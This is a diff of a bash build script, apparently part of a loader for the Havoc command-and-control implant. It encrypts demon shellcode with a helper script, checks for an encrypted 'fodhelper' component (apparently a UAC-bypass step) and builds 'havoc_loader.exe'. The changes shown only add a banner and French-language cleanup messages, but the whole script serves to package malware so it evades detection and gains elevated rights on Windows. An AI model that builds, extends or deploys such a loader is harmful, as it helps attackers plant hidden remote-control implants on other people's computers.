@@ -1,6 +1,12 @@
 #!/bin/bash
 set -euo pipefail
 
+echo ""
+echo "=================================================="
+echo "   AES Encryption - demon.x64.h"
+echo "=================================================="
+echo ""
+
 INPUT_BIN="$1"
 OUTPUT_EXE="$2"
 ARCH="${3:-x64}"
@@ -8,7 +14,10 @@ ARCH="${3:-x64}"
 [[ $# -lt 2 ]] && { echo "usage: $0 demon.x64.bin havoc_loader.exe [x64|x86]"; exit 1; }
 
 # Cleanup
-rm -f "$OUTPUT_EXE" demon.x64.h
+[[ -f "$OUTPUT_EXE" ]] && { rm -f "$OUTPUT_EXE"; echo "[*] Suppression: $OUTPUT_EXE"; } || echo "[*] $OUTPUT_EXE inexistant"
+[[ -f "demon.x64.h" ]] && { rm -f "demon.x64.h"; echo "[*] Suppression: demon.x64.h"; } || echo "[*] demon.x64.h inexistant"
+rm -f *.o
+echo "[*] Nettoyage: fichiers objet supprimés"
 
 python3 myenc.py -i "$INPUT_BIN" -o payload_enc.bin
 grep -q "fodhelper_enc" demon.x64.h || { echo "❌ fodhelper_enc manquant"; exit 1; }
